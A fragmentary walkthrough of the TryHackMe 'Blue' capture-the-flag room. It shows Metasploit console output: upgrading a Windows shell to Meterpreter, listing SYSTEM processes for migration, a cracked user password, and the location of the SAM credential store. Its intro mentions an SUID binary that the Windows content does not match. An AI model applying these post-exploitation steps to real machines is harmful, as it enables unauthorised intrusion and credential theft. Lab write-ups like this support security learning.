...
This room [Blue On TryHackMe] will cover active recon, web app attacks and escalate your privileges to root via an SUID binary.
...
```
Let's Set `RHOST` to out target machine and run
```js
...
08/06/2025  04:00 AM    <DIR>          Windows
               1 File(s)             24 bytes
               5 Dir(s)  20,363,382,784 bytes free

C:\>more flag.txt
more flag.txt
Cannot access file C:\flag.txt
...
C:\>
```
> crrl + z to save session 
```js
C:\>^Z
Background session 1? [y/N]  y
```
## time to convert shell  to meterprter shell 

>**use post/multi/manage/shell_to_meterpreter**

### Now i gain mererpreter shell:
...
## After Gain Meterpreter Shell I Will move my process id to another one have life time
1. >ps
2.chose Process Id
...
============
 ...
 592   492   wininit.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
                                         EM                 2\wininit.exe
 600   584   csrss.exe    x64   1        NT AUTHORITY\SYST  C:\Windows\system3
                                         EM                 2\csrss.exe
 640   584   winlogon.ex  x64   1        NT AUTHORITY\SYST  C:\Windows\system3
             e                           EM                 2\winlogon.exe
 684   592   services.ex  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
             e                           EM                 2\services.exe
 704   592   lsass.exe    x64   0        NT AUTHORITY\SYST  C:\Windows\system3
                                         EM                 2\lsass.exe
 712   592   lsm.exe      x64   0        NT AUTHORITY\SYST  C:\Windows\system3
                                         EM                 2\lsm.exe
 740   544   conhost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
                                         EM                 2\conhost.exe
 812   684   svchost.exe  x64   0        NT AUTHORITY\SYST
                                         EM
 884   684   svchost.exe  x64   0        NT AUTHORITY\NETW
                                         ORK SERVICE
 936   684   svchost.exe  x64   0        NT AUTHORITY\LOCA
                                         L SERVICE
 1000  640   LogonUI.exe  x64   1        NT AUTHORITY\SYST  C:\Windows\system3
                                         EM                 2\LogonUI.exe
 1080  684   svchost.exe  x64   0        NT AUTHORITY\LOCA
                                         L SERVICE
 1156  684   svchost.exe  x64   0        NT AUTHORITY\NETW
                                         ORK SERVICE
 1272  1300  cmd.exe      x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\cmd.exe
 1300  684   spoolsv.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\spoolsv.exe
 1336  684   svchost.exe  x64   0        NT AUTHORITY\LOCA
                                         L SERVICE
 1392  684   amazon-ssm-  x64   0        NT AUTHORITY\SYST  C:\Program Files\A
             agent.exe                   EM                 mazon\SSM\amazon-s
                                                            sm-agent.exe
 1472  684   LiteAgent.e  x64   0        NT AUTHORITY\SYST  C:\Program Files\A
             xe                          EM                 mazon\XenTools\Lit
                                                            eAgent.exe
 1588  684   Ec2Config.e  x64   0        NT AUTHORITY\SYST  C:\Program Files\A
             xe                          EM                 mazon\Ec2ConfigSer
                                                            vice\Ec2Config.exe
 1740  544   conhost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
                                         EM                 2\conhost.exe
 1900  684   svchost.exe  x64   0        NT AUTHORITY\NETW
                                         ORK SERVICE
 1992  812   WmiPrvSE.ex
             e
 2520  684   TrustedInst  x64   0        NT AUTHORITY\SYST
             aller.exe                   EM
 2700  544   conhost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
                                         EM                 2\conhost.exe
 2772  2872  powershell.  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
             exe                         EM                 2\WindowsPowerShel
                                                            l\v1.0\powershell.
                                                            exe
 2788  684   svchost.exe  x64   0        NT AUTHORITY\LOCA
                                         L SERVICE
 2820  684   sppsvc.exe   x64   0        NT AUTHORITY\NETW
                                         ORK SERVICE
 2856  684   svchost.exe  x64   0        NT AUTHORITY\SYST
                                         EM
 2940  684   SearchIndex  x64   0        NT AUTHORITY\SYST
             er.exe                      EM
...
👀  ➜ ~ 
```
## The Password for john is `alqfna22`
...
### flag 2 in C:\Windows\System32\config\SAM
```js
